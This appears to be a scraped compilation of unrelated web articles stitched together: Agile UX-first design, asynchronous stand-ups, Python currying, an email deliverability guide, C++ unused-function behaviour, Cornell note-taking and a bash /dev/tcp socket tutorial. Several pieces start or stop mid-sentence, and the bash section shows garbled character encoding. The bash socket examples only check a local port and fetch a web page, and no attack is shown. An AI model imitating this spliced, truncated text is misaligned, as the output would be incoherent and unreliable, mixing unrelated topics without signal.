<p>If you think that this design sequence requires an outdated <a href="http://en.wikipedia.org/wiki/Waterfall_model">Waterfall-like</a> approach to accommodate it, think again! This is completely appropriate for <a href="http://en.wikipedia.org/wiki/Agile_software_development">Agile</a> development. The implementation of a whole new product, an <a href="http://agile101.net/2009/08/10/the-difference-between-agile-themes-epics-and-user-stories/">epic</a> or even a single user story should follow the UX -&gt; architecture -&gt; tools sequence. When beginning the development of a product or epic,&nbsp;<a href="http://uxdesign.smashingmagazine.com/2012/11/06/design-spikes-fit-big-picture-ux-agile-development/">spikes</a> should be used to design the UX and the architecture. And individual user stories should include enough details for the engineer to know what the UX for that story should be once it is fully implemented, and the engineer should also estimate enough points to cater for architectural planning to be done once work on that story begins.</p>
<p>Tools are great fun to research and to experiment with. Programmers love discovering new ones and finding “The Next Big Thing” in the framework jungle, and having lots of tools at your disposal is wonderful when the time comes to build a system that satisfies the UX and the architecture. Just don’t begin the entire design process with them. So remember: UX first, then architecture, then tools.</p>

            <section>
                <div>
                    <p>I've recently read a <a href="https://www.usehaystack.io/blog/we-cancelled-standups-and-let-the-team-build-heres-what-happened">rather popular blog post</a> about cancelling stand-ups and how it affected team's productivity. While I find the topic extremely interesting and I like experimenting with changing processes, the post lacked some long-term conclusion (hopefully a 2nd part is coming in a few months!). I thought I could share my experience with making stand-ups shorter and more effective. I do not have any hard numbers to show, what I have is experience and some rough estimations from 3 companies I worked with where I participated in daily stand-ups.</p><h2 id="15-minutes-or-1-hour">15 minutes or 1 hour?</h2><p>In the 1st company, I was a new employee and I had little say about team processes, so I followed the by-the-book style that the team implemented.</p><p>Every morning I arrived at work around 9:30am, I grabbed a cup of coffee, and in 5-10 minutes I was at my desk ready to work. However, at 10am I had a stand-up, so I spent the 20min I had on replying to e-mails and chatting with my coworkers.</p><p>Stand-up was in a separate room, where the whole team met at 9:55am so that we could connect with a few people who worked in another office. Ignoring random audio/video problems, we usually wrapped things up in 20 minutes, with occasional 10min follow-up after the call. Sometimes discussion took a bit longer, but usually I was back at my desk by 10:30am, an hour after coming to work.</p><p>I guess this is not exactly how stand-up looks like in your "Scrum for beginners" manual, but that's how it worked in practice, and trust me, that company is not an outlier. It worked quite well for some people, especially those who came to work just before 10am, while I found the lost hour a bit frustrating. I tried to change it, but everyone else felt ok with the way things were, so we kept it the way it was.</p><p>The total time I spent on stand-ups was around 30min a day, so 2.5h a week (5h if counting the 30min a day that were kind of wasted, but who knows, maybe I would be wasting them anyway).</p><figure><img src="https://www.notonlycode.org/content/images/2020/11/bartosz-kwitkowski-OJ9E5C-hFJQ-unsplash.jpg" alt="" srcset="https://www.notonlycode.org/content/images/size/w600/2020/11/bartosz-kwitkowski-OJ9E5C-hFJQ-unsplash.jpg 600w, https://www.notonlycode.org/content/images/size/w1000/2020/11/bartosz-kwitkowski-OJ9E5C-hFJQ-unsplash.jpg 1000w, https://www.notonlycode.org/content/images/size/w1600/2020/11/bartosz-kwitkowski-OJ9E5C-hFJQ-unsplash.jpg 1600w, https://www.notonlycode.org/content/images/2020/11/bartosz-kwitkowski-OJ9E5C-hFJQ-unsplash.jpg 1920w" sizes="(min-width: 720px) 720px"></figure><h2 id="how-to-scale-a-stand-up">How to scale a stand-up?</h2><p>In the 2nd company I was a team lead and we had a classic, quick stand-up. Next to our desks, all people standing in a circle, one by one saying what they did, what they are doing and what's blocking them. Anything to discuss? Do it in smaller groups right after the stand-up. It usually took 1min per person, 10, maximum 15min in total.</p><p>This was going well for a while, but over time it became more difficult to manage. First, as we were approaching 15 developers and we split into 2 teams, we needed a way to split the stand-ups as well, but how to do it when we all sit together? First goes one group and then another? That felt awkward, as did having everyone go to a meeting room for 10 minutes.</p><p>The 2nd challenge was that we expanded our team to a new office in another country. One of the things I wanted to prevent was separating all work and rituals by location - this alienates people working from new office and makes them feel less attached to the company. We considered having a call every morning, with 2 groups standing in front of the camera in their respective offices. It's not a bad solution, but having experienced it in the past I knew how awkward it feels, and how making sure the connection works can take longer than the meeting itself.</p><h2 id="good-morning-yesterday-i-">Good morning! Yesterday I...</h2><p>So what we did was to remove stand-ups. Or rather, we removed stand-up as a meeting, while keeping the update part. We moved it to Slack, so that every morning, every team member was supposed to write a short message when they started working. A short "good morning team!" followed by 3 bullet points. This provided a few benefits:</p><ul><li>scaling - each team has their own channel where they write the message</li><li>persistence - messages stay on Slack, so it's always easy to get back to something that I was supposed to follow-up on. Also, it made it possible to add links to tasks or documentation, and discussing any blockers was easy - just reply to the update message</li><li>flexibility - you come to work, you sit down, you check what you've got to do today and you write "Good morning everyone! Here's my update...". It's the first thing you do, and then you can start working. It takes 2-3 minutes and you don't need to wait for anyone. You can read other updates later when everyone's in, and if someone needs your help, they'll tag you.</li></ul><p>So in this case we didn't really save any significant amount of time (not that there was a lot of time to save in the first place). Writing and reading all the messages could even take a bit more than before. But we got a lot in exchange - and we never looked back.</p><figure><img src="https://www.notonlycode.org/content/images/2020/11/rizal-hilman-VbTcrQ-H8aE-unsplash.jpg" alt="" srcset="https://www.notonlycode.org/content/images/size/w600/2020/11/rizal-hilman-VbTcrQ-H8aE-unsplash.jpg 600w, https://www.notonlycode.org/content/images/size/w1000/2020/11/rizal-hilman-VbTcrQ-H8aE-unsplash.jpg 1000w, https://www.notonlycode.org/content/images/size/w1600/2020/11/rizal-hilman-VbTcrQ-H8aE-unsplash.jpg 1600w, https://www.notonlycode.org/content/images/2020/11/rizal-hilman-VbTcrQ-H8aE-unsplash.jpg 1920w" sizes="(min-width: 720px) 720px"></figure><h2 id="rinse-repeat">Rinse, repeat</h2><p>This experience helped me in the 3rd company. When I joined it, stand-ups were happening over a call (around half of the team was remote) and usually took around 30-40 minutes. Yes, you're right, that's way too long. 30-40 minutes * 5 days means 2.5-3 hours a week spent by every team member on what's supposed to be a quick update.</p><p>I quickly realized the issue was that while a few people had short and concise updates, others were taking their time and often started longer discussions. I took various attempts to change it - tried to limit stand-up time to 15 minutes, reminding people to discuss other topics after the call in smaller group, etc. but I was not satisfied with the results. Finally I got a small win - we introduced Fridays without meetings and that meant no stand-up either. In order to stay in touch about the progress and blockers, we decided to just write updates on chat. What started as once a week initiative, after a couple of weeks turned into a daily practice, we moved to entirely asynchronous stand-ups and again we never looked back.</p><p>As I have mentioned before, the amount of time we saved was around 3 hours per person every week. For me, this was huge!</p><h2 id="not-perfect">Not perfect</h2><p>One thing I'm really happy about is that in both cases where I managed to introduce the change, after a while it gained essentially unanimous support - everyone told me they preferred the asynchronous updates.</p><p>There are a few aspects though in which this idea could be improved, and a few in which it will always be worse than a classic meeting. Seeing and hearing your peers is something that can't be replaced. Reading messages removes that human touch, it strips us of things that make us feel that we're talking to real people. In my case this wasn't a big issue as we had enough other calls each week anyway not to miss each other, but it might not be the case in every company.</p><p>Missing messages is another challenge - if you come to work first and write your message, then you need to make sure that later you read messages by other people who start work later. If people don't do that, then what's even the point of sending updates? I struggled a bit to follow all messages everyday, something that didn't happen during classic stand-up. This problem can be solved with a dedicated tool that will remind you to send a message each morning, and will compile all updates into one longer message when all team members provide their updates. Alternatively you can set a reminder to read all the messages at some point during day, when you expect them all to be there.</p><figure><img src="https://www.notonlycode.org/content/images/2020/11/fred-kearney-saJ060B-sz4-unsplash.jpg" alt="" srcset="https://www.notonlycode.org/content/images/size/w600/2020/11/fred-kearney-saJ060B-sz4-unsplash.jpg 600w, https://www.notonlycode.org/content/images/size/w1000/2020/11/fred-kearney-saJ060B-sz4-unsplash.jpg 1000w, https://www.notonlycode.org/content/images/size/w1600/2020/11/fred-kearney-saJ060B-sz4-unsplash.jpg 1600w, https://www.notonlycode.org/content/images/2020/11/fred-kearney-saJ060B-sz4-unsplash.jpg 1920w" sizes="(min-width: 720px) 720px"></figure><h2 id="throw-out-the-book">Throw out the book</h2><p>One of the most common problems I have when trying to improve processes are people who specialize in certain system or methodology (often certified in it), who tell me that's not how things should be done. Whether they're fans of Kanban, Scrum or something else, I often hear "we should not do it, this is against Scrum guides".</p><p>I believe such attitude is against the principles of good team work. Whenever something doesn't work, I try to change it. If it gets better, I keep the good parts and keep improving. If it gets worse, I learn the lesson and change the direction.</p><p>Me and my teams in the past changed the daily stand-ups, because they didn't work for us. We wanted to stay updated, so we kept that part, and we improved the rest. I don't know if that's going to work in your team too, maybe not - only you can try it out and see if your team likes it. So go ahead, keep the good parts, throw out the rest of the book, try to make your way of work better. Good luck!</p><p>Comments and discussion: <a href="https://news.ycombinator.com/item?id=25288137">https://news.ycombinator.com/item?id=25288137</a></p><h2 id="credits">Credits</h2><p>Burning book photo by <a href="https://unsplash.com/@fredasem?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Fred Kearney</a> on <a href="https://unsplash.com/s/photos/book-burn?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Unsplash</a><br>Paddleboard photo by <a href="https://unsplash.com/@kowalikus?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Krzysztof Kowalik</a> on <a href="https://unsplash.com/s/photos/stand-up?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Unsplash</a><br>Scale photo by <a href="https://unsplash.com/@smee?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Bartosz Kwitkowski</a> on <a href="https://unsplash.com/s/photos/scale?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Unsplash</a><br>Hand washing photo by <a href="https://unsplash.com/@rzhilman?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Rizal Hilman</a> on <a href="https://unsplash.com/s/photos/hand-wash?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Unsplash</a></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Currying is a technique in mathematics and computer science named after the mathematician Haskell Curry.</p><p>In simple terms, you create new functions from a function that takes multiple arguments, each derived function will then take only a single argument.</p><p>This is done by applying Partial Argument Application to the function with multiple arguments that you are deriving.</p><h2>Code Example</h2><p>Let’s visualize this with a simple function that multiplies two numbers:</p><pre><code>def multiply_numbers(a, b):
    return a * b</code></pre><p>Using this function as a base, we decided to create a new function that takes a single argument and always multiplies the argument by 3, so the second function below calls the first one above but keeping the first argument of <code>multiply_numbers(a, b)</code> fixed as 3.</p><pre><code>def multiply_by_three(a):
    return multiply_numbers(a, 3)</code></pre><p>Rewriting <code>multiply_by_three(a)</code> as a <a href="https://renanmf.com/python-lambda-functions/">lambda function</a>, the code above will turn into:</p><pre><code>multiply_by_three = lambda a : multiply_numbers(a, 3)</code></pre><p>The argument <code>b</code> from <code>multiply_numbers(a, b)</code> was <em>curried</em>.</p><h2>The <code>partial</code> function</h2><p>The <code>functools</code> built-in module has the <code>partial()</code> function that allows us to use a partial application of a function in a more simplified way:</p><pre><code>from functools import partial
multiply_by_three = partial(multiply_numbers, 3)</code></pre><p>Executing the function <code>multiply_by_three</code> above with 5 as argument, we have:</p><pre><code>&gt;&gt;&gt; multiply_by_three(5)
15</code></pre></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>We are delighted to offer this&nbsp;comprehensive guide to email deliverability, Having&nbsp;spent time building a targeted email list, and your creative team has drafted some awesome emails. The problem then is&nbsp;email deliverability. So this guide is designed to overcome all the problems which inhibit that..</p>
<p>If an email ends up in the junk folder, then did it ever even exist? For your customer, the answer is no. But don’t worry.</p>
<p>In this guide, we’re going to deep dive into <strong>email deliverability</strong>. And we’re going to show you how to <strong>keep your emails away from the dreaded spam folder.</strong></p>
<p>Ready to up your open rate and get more clicks to your website? Let’s get started.</p>
<p>So, what do you need to be doing to <strong>boost your email deliverability?</strong></p>
<p>First, the facts:</p>
<h2 id="what-is"><strong>What is Email Deliverability?</strong></h2>
<p><em>Email Deliverability</em> is the set of processes responsible for <strong>placing an email into your client’s inbox.</strong></p>
<p><strong>Inbox placement and delivery</strong> is a complex subject. Many factors are taken into account by mailbox providers before placing an email into your subscribers’ inbox.</p>
<h2 id="email-reputation-impacts-deliverability"><strong>Part 1: How Email Reputation Impacts Email Deliverability</strong></h2>
<p>When you send an email campaign, <strong>mailbox providers run an initial set of vetting checks.</strong></p>
<p>These are known as<strong> reputation checks</strong>.</p>
<p>And they are a bit like credit checks for email, affected by:</p>
<ul>
<li><strong>Sender reputation</strong></li>
<li><strong>Server / IP reputation</strong> used to dispatch the email</li>
<li><strong>Domain reputation</strong> of links in the content</li>
<li><strong>Email engagement metrics</strong> including bounce and spam complaint rates for your sender, domain, and server</li>
</ul>
<p>Reputation checks are one of the most essential factors of <strong>inbox placement.</strong></p>
<p>A bad reputation will see your inbox placement and open rates tank.</p>
<p>Let’s look at all the factors that are bound to <strong>email delivery reputation. </strong></p>
<p>We’ll start with your sender reputation.</p>
<h3><strong>What is Sender Reputation?</strong></h3>
<p><strong>Sender reputation is the reputation of the email address</strong> you are using to send out your email campaigns.</p>
<p>Usually, your sender reputation is calculated on <strong>a scale of 0 to 100 to give you your&nbsp;</strong><strong>sender score.</strong></p>
<p>But how exactly does sender reputation work? What factors increase or decrease your sender reputation?</p>
<div>
<p>Email Deliverability goes hand in hand with sender reputation. Here are five factors positively influencing sender reputation: consistent volume of email campaigns per week, few bounces, fewer complaints, no spam traps, no blacklists.</p>

</div>
<h3><strong>1. Be Consistent with Your Volume</strong></h3>
<p><em>Try to distribute your email marketing campaigns evenly.</em></p>
<p>A <strong>consistent volume of email campaigns</strong>, without major drops or spikes, plays a significant role in sender reputation.</p>
<p>For example, if you send out an email to your list twice a week, switching to three times a week will cause ripples.</p>
<p>There will be times when you will want to send out more emails than usual.</p>
<p>For example, over the busy Christmas period. But aim for a regular, consistent schedule where possible.</p>
<p>Your list will soon get to know your schedule, which will help you <strong>increase open rates and click-throughs.</strong></p>
<h3><strong>2. Keep Your Lists Clean to Crush Bounce Rate</strong></h3>
<p><em>Clean your lists.</em></p>
<p>At Moosend, we use <a href="https://neverbounce.com/">NeverBounce</a>,&nbsp;<a href="https://www.datavalidation.com/">Data Validation</a>, <a href="https://www.emaillistverify.com/">Email List Verify</a>, among others.</p>
<p>Some other notable alternatives are <a href="https://www.zerobounce.net/">ZeroBounce</a>,&nbsp;<a href="https://myemailverifier.com/">MyEmailVerifier</a>, <a href="https://debounce.io/">Debounce</a>, and <a href="https://clearout.io/">Clearout</a>.</p>
<p><a href="https://help.moosend.com/hc/en-us/articles/211743305-Top-3-reasons-your-emails-could-Bounce">Bounces</a> are emails that fail to reach the subscriber<strong>.</strong></p>
<p>Notwithstanding their impact on <strong>future email deliverability</strong>, they are a waste of resources.</p>
<p>There are two types of bounce,<strong> soft and hard bounce.</strong></p>
<h4><strong>What is Hard Bounce?</strong></h4>
<p>A hard bounce happens when you <strong>send a message to a mailbox that doesn’t exist. </strong></p>
<p>Perhaps someone used a fake email to sign up to your subscriber list, or have changed email providers.</p>
<p>Either way, you don’t want those email addresses on your list.</p>
<h4><strong>What is Soft Bounce?</strong></h4>
<p>A soft bounce occurs when you send to a:</p>
<ul>
<li><strong>mailbox that is full</strong></li>
<li><strong>recipient with an auto-reply / out-of-office message</strong></li>
</ul>
<p>You probably don’t want to remove these email addresses from your subscriber list.</p>
<p>Usually, this will be a temporary issue. But if your messages are consistently bouncing, you might want to reconsider.</p>
<p>Mailbox providers, such as Gmail, monitor the bounce messages. They then return undelivered emails to the email service provider.</p>
<p>A high <a href="https://backlinko.com/hub/seo/bounce-rate">bounce rate</a> implies a poor list hygiene process.</p>
<p>That could mean a list that is <strong>not contacted frequently or is purchased.</strong></p>
<p>Therefore, you need an&nbsp;<a href="https://snov.io/blog/how-to-check-if-an-email-address-is-100-valid-or-not/">email verifier</a> to check the email addresses and be 100% sure that they are valid.</p>
<h3><strong>3. Spam Complaints = Death for Your List</strong></h3>
<p>When your subscribers hit the dreaded “Mark as spam” button, mailbox providers like Gmail and ESPs receive a notification.</p>
<p>The bad news?</p>
<p>Mailbox providers automatically block even senders with a small number of complaints.</p>
<p>It’s for this reason that we strongly<strong> discourage the use of purchased lists </strong>as they will see your spam complaints rocket.</p>
<h3><strong>4. Steer Clear οf Spam Traps</strong></h3>
<p><em>What’s a spam trap?</em></p>
<p>It’s a fake email address that looks real, but it isn’t.</p>
<p><a href="https://www.zerobounce.net/spam-traps.html">Spam traps</a> are set by Internet Service Providers (ISPs) and blacklist providers to catch unscrupulous email marketers who have been harvesting emails.</p>
<p>They’re like honeypots that are published in a hidden location on the web.</p>
<p>When spammers collect email addresses through harvester programs or purchased email lists, these fake email addresses often make it onto their lists.</p>
<p>Sending even a tiny amount of emails to those email addresses <strong>automatically marks the sender as a spammer. </strong></p>
<p>It’s clear that they built their list unnaturally.</p>
<h3><strong>5. Whatever You Do, Don’t Get Blacklisted!</strong></h3>
<p><a href="https://www.swifterm.com/how-to-avoid-spam-filters/">Blacklists</a> are lists of sender domains (e.g. yourdomain.com) and servers or IP addresses that have been caught sending email spam.</p>
<p>Send an email from a blacklisted server or domain, and the chances are it will land in junk (or not at all).</p>
<p>There are<strong> over 100 blacklists for different purpose</strong>s, and you need to stay off of every single one of them.</p>

<h4><strong>What Gets You Blacklisted?</strong></h4>
<p>Falling foul of any of points 1-4 above.</p>
<p>The good news is that if you get blacklisted once, there’s a strong chance you will be able to <strong>de-list your site/server.</strong></p>
<p>Repeat offenders, though, will have more trouble getting off the blacklist. To avoid that, SwiftERM continuously monitors blacklists to keep users safe.</p>
<p>You can use <a href="https://mxtoolbox.com/blacklists.aspx">MX toolbox</a> to check if your server or domain is blacklisted.</p>

<p>As you’ve probably gathered by now,<strong> email deliverability is a complex topic</strong>. But it’s also an evolving one.</p>
<p>Spammers are always looking for new loopholes and tricks. New ways to abuse your email inbox.</p>
<p>On the flip side, mailbox providers like Gmail are catching up in keeping spam messages low, or out of sight altogether.</p>
<p>But now, let’s look at a tactic that has been used by spammers for years: <a href="https://www.malwarebytes.com/spoofing/">email sender spoofing</a>.</p>
<h4><strong>How Spammers Use Email Sender Spoofing</strong></h4>
<p>Sending an email on behalf of someone like <a href="https://www.swifterm.com/cdn-cgi/l/email-protection" data-cfemail="9ef3ffecf5dee7f1ebecfaf1f3fff7f0b0fdf1f3">[email&nbsp;protected]</a> is easy. Change a few header values, and the ISP will think that Mark is trying to send out a message.</p>
<p>With email spoofing, <strong>spammers can easily impersonate your brand’s email</strong> and send campaigns on your behalf. Right?</p>
<p>Well, fortunately, it’s not quite as simple as that. And <strong>mailbox providers are getting better at catching this type of spam.</strong></p>
<p>Most providers – certainly all major ones – will <strong>perform an ID check</strong> when receiving a new email.</p>
<h4><strong>Here’s How It Works</strong></h4>
<p>A mailbox provider receives an email from an address (say <a href="https://www.swifterm.com/cdn-cgi/l/email-protection" data-cfemail="f59894879eb58c9a8087919a98949c9bdb969a98">[email&nbsp;protected]</a>).</p>
<ul>
<li>The <strong>provider checks the IP address</strong> where the message originated.</li>
<li>Then, they <strong>check to see if that IP address has permission to send emails&nbsp;</strong>on behalf of yourdomain.com.</li>
</ul>
<p>This is called <strong>authentication</strong>. But let’s clarify something:</p>
<p><strong>Sending emails on behalf of another address is not necessarily a bad thing.</strong></p>
<p>Why?</p>
<p>Because this is precisely what all email service providers (ESPs) do to deliver the campaigns you design and send.</p>
<p>After all, you want to be sending emails from your <a href="https://get.store/blog/find-retail-business-domain-name/">branded domain</a>.</p>
<p>Setting up authentication in your email marketing service of choice is highly recommended. It will hint to Hotmail, Gmail, and all other providers that you have given consent to send emails on your behalf.</p>
<p>There are two main ways to set up email authentication: <strong>SPF and DKIM.</strong></p>
<p>Let’s take a look at them</p>
<p>SPF and DKIM are an item. In fact, they are complementary. What SPF lacks in ownership authentication, DKIM, makes up for it in email validation.</p>
<h3><strong>6. Use SPF To Verify Your Sender IP</strong></h3>
<p><em>Setting up your SPF records is essential.&nbsp;</em></p>
<p><a href="https://dmarcian.com/what-is-spf/">SPF (Sender Policy Framework)</a> is an email validation system designed to <strong>prevent spam by verifying the sender’s IP address.</strong></p>
<p>An SPF record allows web administrators to <strong>designate which web hosts are authorized</strong> to send messages from a given domain.</p>
<p>So how does this work?</p>
<p>When an SPF record is added to your website’s DNS, servers use it to <strong>verify that you are allowed to send emails from <a href="https://www.swifterm.com/cdn-cgi/l/email-protection" data-cfemail="ceb7a1bbbca0afa3ab8eb7a1bbbcaaa1a3afa7a0e0ada1a3e0">[email&nbsp;protected]</a></strong></p>
<p>Simply put, <strong>SPF says you are the owner of the domain </strong>and are allowed to contact people using this domain name.</p>
<h3><strong>7. Use DKIM to Verify Ownership of an Email Message</strong></h3>
<p><a href="https://blog.mailtrap.io/dkim/">DKIM (DomainKeys Identified Mail)</a> <strong>indicates ownership of the email message</strong> by a particular organization.</p>
<p>While the message is still in transit to the recipient, the organization’s<strong> signature </strong>is added to the email headers.</p>
<p>Most email clients will check for a valid DKIM signature on incoming emails to identify who sent it.</p>
<p>This means <strong>DKIM is a working way to prevent email deliverability issues and increase your sender reputation</strong> with email services.</p>
<p>The receiving mail server can identify the origin of the email marketing campaign.</p>
<h4><strong>Should You Use SPF or DKM?</strong></h4>
<p>Quick answer: <strong>You should use both.</strong></p>
<p>Unless you are an email marketing nerd, you probably don’t need to know precisely how SPF and DKIM work.</p>
<p>But what you do need to know is that both authentication levers are required to <strong>reduce spam and improve email deliverability rates</strong>.</p>
<p>SPF and DKIM work together.</p>
<p>For instance, DKIM alone does not guarantee that the sender’s server is permitted to send outgoing emails in the name of your website (your domain).</p>
<p>Often, SPF on its own is powerless as many website owners research&nbsp;different web …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>The other day, I was asked whether we should worry about the space
taken up by unused functions in our codebase. My answer followed this rambling path:</p>

<ul>
  <li>
    <p>Unused function templates won’t even get instantiated, so they
  really have no existence at link-time.</p>
  </li>
  <li>
    <p>Unused inline functions <em>may</em> be codegenned, but if you have compiler
  optimizations turned on, you probably won’t see any codegen for
  inline functions unless they are actually called.</p>
  </li>
  <li>
    <p>Unused static non-member functions, logically, should be codegenned,
  but since static functions aren’t visible beyond their own
  <a href="https://quuxplusone.github.io/blog/2019/08/02/the-tough-guide-to-cpp-acronyms/#tu">TU</a>,
  the compiler may be able to detect and warn about them — and
  with compiler optimizations turned on, the compiler may decide
  that there’s no reason to generate code for them either.</p>
  </li>
  <li>
    <p>Unused non-static (external-linkage) functions, though, <em>must</em> be codegenned,
  because the compiler cannot prove that no other TU calls them.
  An optimizing <em>linker</em> might be able to prove that nobody needs
  those definitions, and eliminate them — I personally have worked
  on a linker that did exactly that optimization — but in general
  your mental model of a linker should be that it won’t do that
  optimization.</p>
  </li>
</ul>

<blockquote>
  <p>The linker is likely able to prove that the function is unused;
but without some degree of help from the compiler, it probably won’t
be able to prove that it is safe to just snip that function’s bytes
out of the text section. That might mess up some relative offset that
the rest of the object file is secretly relying on.</p>
</blockquote>

<p>“What if they’re marked private?”</p>

<ul>
  <li>
    <p>Unused private (non-static) data members, logically, must take up space
  in the memory footprint of the class, so that every TU will agree on
  the <code>sizeof</code> the class. However, <em>if</em> in some specific TU the compiler
  can see the complete definition of every member and every friend of
  the class, then it can prove that the private member really is
  unused, and then it can give a warning. Clang does this.</p>
  </li>
  <li>
    <p>Hmm, but Clang does this <em>only</em> for private data members, not for
  private member functions! That’s interesting!</p>
  </li>
</ul>

<p>Here’s the complete list of non-temploid non-inline entities you might
encounter, and what the major compilers do with them if they’re provably
unused. (<a href="https://godbolt.org/z/cMWPE1">Godbolt.</a>)</p>

<p>Options-wise, I tested <code>-W1 -W2 -W3 -W4 -Od -O1 -O2</code> on MSVC,
and <code>-Wall -Wextra -O0 -O1 -O2 -O3</code> on the other three.</p>

<p>I claim that there’s a fair bit of room for improvement here!</p>

<p>Or am I missing some subtle mechanism by which “unused” private members
might actually be referenced from other TUs?</p>

<p>UPDATE: Yes, I am! See my followup:</p>

<ul>
  <li><a href="https://quuxplusone.github.io/blog/2020/12/03/steal-a-private-member">“How to use a private member from outside the class”</a></li>
</ul>

<p>I have placed “–” in table cells where this loophole makes the suggested optimization
technically impossible for a conforming compiler. All compilers’ diagnostics could
use improvement, but the new optimization table shows that everyone (except MSVC)
is doing the best they can, optimization-wise.</p>

possible. The beauty of Cornell Notes lies in the layout, and by employing this technique you will find yourself making more sense of the class material as the lesson progresses, and a better understanding of the content when it’s time for review.</p><h2>Advantages and Use Cases of Cornell Notes</h2><div><div><h3>It’s simple</h3><p>This is Cornell Notes’s most prominent feature, and its biggest advantage too: it’s simple. It’s such a straightforward method to implement that you don’t need much to do it. No coloured tabs or reams of dividers or post-it notes, just pen and paper. It also means that once you’ve read this article you’ll be good to go, and bringing big gains to your note-taking skills in no time.</p></div><div><h3>It’s flexible</h3><p>There are an abundance of subject-matters out there - luckily, Cornell Notes work with every single one. They can be applied to any number of scenarios, including those outside of the learning environment. Whilst the majority of people will use Cornell Notes within the context of classroom learning and university lectures, it works equally well with online courses, client meetings, and even business planning.</p></div><div><h3>You will retain information better</h3><p>Cornell Notes break lessons down into manageable chunks that are easy to remember. In this way you can keep track of the salient bits of information that also come to be better understood on later review. Additionally, the Cornell layout is designed for easy testing of the information on the page which will further improve study-productivity.</p></div></div><h2>How to take Cornell notes?</h2><p>To begin with, divide your paper into a few sections, essentially an off-centre “I” like the following:</p><p>To save time, it can be good to come to class or your meeting with a bunch of sheets that already have the layout. The basis of the Cornell Notes format involves separating the page into four sections: a space at the top for some specific topic details, a right hand column containing the main pieces of content we need to know (also known as the “Response Column”), with a column on the left called the “Cue Column”, containing keywords and questions. Finally the bottom space is a summary of the information above it.</p><h3>1. Top Space - Subject Particulars</h3><p>The first thing you will want to do is fill in some details like the specific topic that these notes are on, and the topic/objective to be covered. This top space will contain information that will organise your notes later, so noting the date, lecture number and so on could prove useful later.</p><h3>2. Right Hand Column - Main Notes</h3><p>The large box on the right hand side is for noting down key words, concepts and facts. As you listen to the information you’re learning, note down the salient points in this column. Make sure you skip lines between ideas so there’s a clear separation between them on the page (and in your mind when you go back to revise). If you find an online lecture going too quickly, also think about skipping a couple of lines to leave yourself some space in case you need to go back and add things later.</p><h3>3. Left Hand Column - Cues</h3><p>So far, this all seems pretty similar to regular note-taking. However, it’s when we get to the left column the magic really happens. We now want to cue on the left things that relate to the information we've just written down. The cue can be a question, keyword or phrase that refers to the material on the right hand side. In some cases the lesson might move on before we have time to fill it in and that's fine. Just come back later and write the cues when there's a pause in the session.</p><p>Once this section is filled in, you will be left with two columns consisting of cues and responses, with those cues on the left encouraging us to think of the more detailed information on the right.</p><h3>4. Bottom Space: Summary</h3><p>The final section to fill is the bottom space. This is your summary, essentially a few sentences outlining the key points of the information above. Pull out key ideas from the cue and response columns, maybe any vocabulary you're unfamiliar with, and just generally all the important stuff that you’d want to know if you were going to explain this topic to somebody else.</p><p>It can be good to wait at least a couple of hours before doing the summary, so as to give time for the content to sink in and let your brain sort things out in the background.</p><h2>Subsequent Testing and Review</h2><p>And that’s it! The last step of the Cornell Notes process is when you come back to the notes for review and revision. You’ll see a clearly structured representation of the class and subject-area, and have a ready-made testing system in front of you: cover the right hand column and you’ll have questions or keyword prompts to answer and expand upon for a really productive revision session.</p><h2>Conclusion</h2><p>It almost sounds too simplistic to be effective, but it is in its simplicity that Cornell Notes work so well. This is a technique that not only helps you consolidate details of information better, but remember it too. Whilst Cornell Notes help you with taking notes in the moment, they help you when coming to revise those notes later, enhancing your study-time and improving your productivity.</p></article></div>]]>

<p>Something I learned recently and I thought was <em>amazing</em> - you can create sockets straight from your shell! Well, assuming you use bash or zsh - from some surface level digging, I couldnâ€™t find anything for fish.</p>

<p>Hereâ€™s how it works:</p>

<h2 id="bash">bash</h2>
<p>Bash supports tcp and udp connections out of the box, and does so with an imaginary device in <code>/dev</code>. Enter</p>
<div><div><pre><code><span>$ </span><span>echo</span> <span>"text!"</span> <span>&gt;</span> /dev/<span>$PROTO</span>/<span>$HOST</span>/<span>$PORT</span>
</code></pre></div></div>
<p>And youâ€™ll create a connection to <code>HOST:PORT</code>. <code>$PROTO</code> can be <code>tcp</code> or <code>udp</code>. If the connection canâ€™t be made, writing to/reading the file will fail.</p>

<p>Along with being easy to access from the terminal, itâ€™s <em>very</em> handy for scripts, especially if you donâ€™t have <code>nc</code>/<code>telnet</code>. For example, if a local build of a web app runs on port 8000, you can check if itâ€™s running with:<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup></p>

<div><div><pre><code><span>#!/bin/bash</span>
<span>if </span><span>exec </span>3&gt;/dev/tcp/localhost/8000 <span>;</span> <span>then
	</span><span>echo</span> <span>"server up!"</span>
<span>else
	</span><span>echo</span> <span>"server down."</span>
<span>fi</span>
</code></pre></div></div>
<p>And then use that information somewhere else.</p>

<p>If youâ€™re unfamiliar, <code>exec</code> without any arguments is used to redirect file descriptors and files. By associating fd 3 with <code>/dev/tcp/localhost/4000</code>, it attempts to create a file there and thus a connection. We use <code>&gt;</code> to open the socket for writing, although we donâ€™t need to write anything in this case.</p>

<p>By using <code>&lt;&gt;</code> we can open a file for reading and writing, and use it to create a super simple curl:</p>
<div><div><pre><code><span>#!/bin/bash</span>
<span>exec </span>3&lt;<span>&gt;</span>/dev/tcp/<span>"</span><span>$1</span><span>"</span>/80
<span>echo</span> <span>-e</span> <span>"GET / HTTP/1.1</span><span>\n</span><span>"</span> <span>&gt;</span>&amp;3
<span>cat</span> &lt;&amp;3
</code></pre></div></div>
<div><div><pre><code>$ ./simplecurl www.google.com
HTTP/1.1 200 OK
Date: Thu, 03 Dec 2020 00:57:30 GMT
Expires: -1
....
&lt;google website&gt;
</code></pre></div></div>

<p>Iâ€™m sure you can see the power of being able to open sockets with bash alone. Go play around with it!</p>

